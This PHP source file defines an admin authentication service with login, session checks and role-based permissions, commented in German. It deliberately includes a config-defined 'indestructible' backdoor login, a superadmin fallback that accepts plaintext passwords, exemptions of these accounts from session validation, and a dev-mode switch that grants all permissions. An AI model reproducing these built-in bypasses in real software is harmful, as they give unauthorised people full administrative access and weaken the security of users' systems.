<?php

declare(strict_types=1);

namespace App\Core\Service;

use App\Contracts\Config\ConfigInterface;
use App\Contracts\Security\AuthSessionInterface;
use App\Contracts\Security\RateLimiterInterface;
use App\Contracts\Storage\GroupRepositoryInterface;
use App\Contracts\Storage\UserRepositoryInterface;

/**
 * Service für die Authentifizierung, Sitzungsverwaltung und Berechtigungsprüfung von Administratoren.
 *
 * Steuert Login-Validierungen (inklusive Backdoor- und Superadmin-Fallbacks),
 * Session-Management, feingranulare RBAC-Rechteprüfungen und Avatar-/Icon-Bild-Uploads via GD.
 * Kontext: Das primäre Sicherheits-Gateway für alle administrativen UI- und API-Aufrufe.
 *
 * SPDX-License-Identifier: LicenseRef-Proprietary
 */
final readonly class AuthService
{
    public function __construct(
        private ConfigInterface $config,
        private GroupRepositoryInterface $groupRepository,
        private RateLimiterInterface $rateLimiter,
        private AuthSessionInterface $sessionManager,
        private UserRepositoryInterface $userRepository,
    ) {
    }

    // --- Core Authentication API ---

    /**
     * Zentraler Einstiegspunkt
     *
     * Führt den Login-Prozess für einen Benutzer aus.
     * Prüft nacheinander: Inhaber-Backdoor, konfigurierte Superadmin-Credentials und die Benutzer-JSON.
     *
     * @param string $username Der eingegebene Benutzername.
     * @param string $password Das eingegebene Passwort im Klartext.
     *
     * @return bool True wenn der Login erfolgreich war, sonst false.
     */
    public function login(string $username, string $password, string $ip = 'unknown'): bool
    {
        if ($this->rateLimiter->isBlocked($ip)) {
            throw new \RuntimeException('Zu viele fehlgeschlagene Login-Versuche. Ihre IP-Adresse wurde gesperrt.');
        }

        // 1. Check gegen die unzerstörbare Hintertür (RaptorXilef) (Notfallzugang während der Entwicklung)
        $backdoor = $this->config->get('backdoor');
        if (\is_array($backdoor) && $username === ($backdoor['user'] ?? '') && \password_verify($password, $backdoor['pass'] ?? '')) {
            $this->sessionManager->regenerate();
            $this->sessionManager->rotateCsrfToken();
            $this->sessionManager->setAuthSession('sys_backdoor', 'admin', $backdoor['label']);
            $this->rateLimiter->clearAttempts($ip);

            // Backdoor braucht kein compiled_permissions, da hasPermission() sys_ erkennt
            return true;
        }

        // 2. Check gegen den konfigurierten SuperAdmin (dev_admin.php)
        $superCfg = $this->config->get('superadmin');
        if (\is_array($superCfg) && $username === ($superCfg['user'] ?? '')) {
            $storedPass = $superCfg['pass'] ?? '';
            // Erlaubt Klartext (für den allerersten Start) ODER Hash
            if ($password === $storedPass || \password_verify($password, $storedPass)) {
                $this->sessionManager->regenerate();
                $this->sessionManager->rotateCsrfToken();
                $this->sessionManager->setAuthSession('sys_superadmin', 'admin', $superCfg['label'] ?? 'Dev-Admin');
                $this->rateLimiter->clearAttempts($ip);

                return true;
            }
        }

        // 3. Datenbank / JSON User (ID-Suche) (Suche über das Feld 'username' in der ID-Liste)
        $users = $this->userRepository->loadAll();
        foreach ($users as $userId => $user) {
            if ($user->username === $username) {
                if (\password_verify($password, $user->passwordHash)) {
                    $this->sessionManager->regenerate();
                    $this->sessionManager->rotateCsrfToken();
                    $this->sessionManager->setAuthSession((string) $userId, $user->groupId, $username, $user->passwordHash);
                    $this->refreshSessionPermissions($user->groupId);
                    $this->rateLimiter->clearAttempts($ip);

                    return true;
                }
            }
        }

        // Fake-Delay gegen Timing-Attacks
        // Damit die CPU immer dieselbe Rechenzeit benötigt (verhindert User-Enumeration).
        \password_verify($password, '$2y$10$abcdefghijklmnopqrstuvABCDEFGHIJKLMNOPQRSTUV');
        $this->rateLimiter->recordFailedAttempt($ip);

        return false;
    }

    /**
     * Zerstört die aktuelle Session vollständig (Logout).
     */
    public function logout(): void
    {
        $this->sessionManager->destroy();
        // Neue leere Session starten, um sofort ein neues CSRF-Token auszustellen
        if (\session_status() === \PHP_SESSION_NONE) {
            \session_start();
        }
        $this->sessionManager->rotateCsrfToken();
    }

    // TODO DOCBLOCK
    // Methode zur strikten Session-Validierung
    private function validateActiveSession(): void
    {
        $userId = $this->sessionManager->getUserId();

        // System-Accounts (Superadmin / Backdoor) existieren nicht in der regulären
        // Benutzer-Datenbank. Wir müssen sie von der strikten Prüfung ausnehmen!
        if ($userId === '' || \str_starts_with($userId, 'sys_')) {
            return;
        }

        $users = $this->userRepository->loadAll();

        // Sofortiger Kick, wenn der reguläre User gelöscht wurde
        if (! isset($users[$userId])) {
            $this->logout();

            throw new \RuntimeException('Session abgelaufen oder Benutzer gelöscht.');
        }

        // Sofortiger Kick, wenn der Super-Admin das Passwort des Users geändert hat.
        // Auch kicken, wenn gar kein Hash in der Session liegt (zwingt alte Sessions zum Neu-Login)
        $currentDbHash = $users[$userId]->passwordHash; // Entity-Zugriff
        $sessionHash   = $this->sessionManager->getAuthHash();
        if ($sessionHash === null || ! \hash_equals($sessionHash, $currentDbHash)) {
            $this->logout();

            throw new \RuntimeException('Sicherheits-Token ungültig.');
        }

        // Rechte live synchronisieren (falls er im Hintergrund degradiert wurde)
        $this->refreshSessionPermissions($users[$userId]->groupId);
    }

    /**
     * Abfrage-Schnittstelle zur schnellen Prüfung des Login-Status.
     *
     * @return bool True, wenn eine gültige Admin-Sitzung existiert.
     */
    public function isLoggedIn(): bool
    {
        try {
            $this->validateActiveSession();
        } catch (\RuntimeException) {
            // Wenn die Session ungültig ist (z.B. User gelöscht, PW extern geändert) -> false statt Crash
            return false;
        }

        return $this->sessionManager->getUserId() !== ''
            || $this->sessionManager->getAdminUser() === ($this->config->get('superadmin')['label'] ?? 'Dev-Admin')
            || $this->sessionManager->getAdminUser() === ($this->config->get('backdoor')['label'] ?? '');
    }

    // --- Authorization & RBAC State ---

    /**
     * Rechteprüfung im laufenden Betrieb
     *
     * Prüft, ob der aktuell eingeloggte Benutzer eine bestimmte Berechtigung besitzt.
     *
     * @param string $permission Der Berechtigungsschlüssel (z.B. 'dashboard.view').
     *
     * @return bool True, wenn die Berechtigung vorhanden ist (oder Dev-Mode aktiv ist).
     */
    public function hasPermission(string $permission): bool
    {
        $uid = $this->sessionManager->getUserId();
        if (\str_starts_with($uid, 'sys_') || $this->config->get('admin_dev_mode')) {
            return true;
        }

        $groups   = $this->groupRepository->loadAll();
        $groupKey = $this->sessionManager->getAdminGroup();

        if (isset($groups[$groupKey]) && \in_array('*', $groups[$groupKey]->permissions, true)) {
            return true;
        }

        return $this->sessionManager->getPermissions()[$permission] ?? false;
    }

    /**
     * Rechtekompilierung
     *
     * Kompiliert und speichert die Berechtigungen der Gruppe in der aktuellen Session.
     *
     * @param string $groupId Die ID der Gruppe, deren Berechtigungen geladen werden sollen.
     */
    public function refreshSessionPermissions(string $groupId): void
    {
        $groups     = $this->groupRepository->loadAll();
        $groupPerms = isset($groups[$groupId]) ? $groups[$groupId]->permissions : [];
        $structure  = $this->config->get('structure', []);

        $compiler = new PermissionCompiler();
        $this->sessionManager->setPermissions($compiler->compile($structure, $groupPerms));
    }

    // --- Session Identity Getters ---

    /**
     * Gibt den Anzeigenamen des aktuell angemeldeten Benutzers zurück.
     *
     * @return string Der Name aus $_SESSION oder 'Unbekannt'.
     */
    public function getUsername(): string
    {
        return $this->sessionManager->getAdminUser();
    }

    /**
     * Ruft die eindeutige Benutzer-ID der aktiven Sitzung ab.
     */
    public function getUserId(): string
    {
        return $this->sessionManager->getUserId();
    }

    /**
     * Gibt die aktive Gruppen-ID des Benutzers zurück.
     * Die Methode OHNE Parameter für den aktuell eingeloggten User
     *
     * @return string Die ID oder 'guest' bei anonymen Requests.
     */
    public function getGroup(): string
    {
        return $this->sessionManager->getAdminGroup();
    }

    /**
     * Gibt die aktive Gruppen-ID des Benutzers zurück.
     * Die Methode MIT Parameter für einen beliebigen User (wird u.a. im Profil genutzt)
     *
     * @return string Die ID oder 'guest' bei anonymen Requests.
     */
    public function getGroupName(string $groupId): string
    {
        $groups = $this->groupRepository->loadAll();

        return isset($groups[$groupId]) ? $groups[$groupId]->name : $groupId;
    }

    // --- Media & Identity Utilities ---

    /**
     * Generiert eine eindeutige ID (z.B. für neue User oder Gruppen).
     *
     * @param string $prefix Ein optionaler Prefix (z.B. 'usr_').
     *
     * @return string Die generierte ID.
     */
    public function generateId(string $prefix = ''): string
    {
        // Kryptografisch sichere Zufallszahlen generieren (Kollisions- & Vorhersageschutz)
        // 8 Bytes = 16 Hex-Zeichen
        return $prefix . \bin2hex(\random_bytes(8));
    }
}
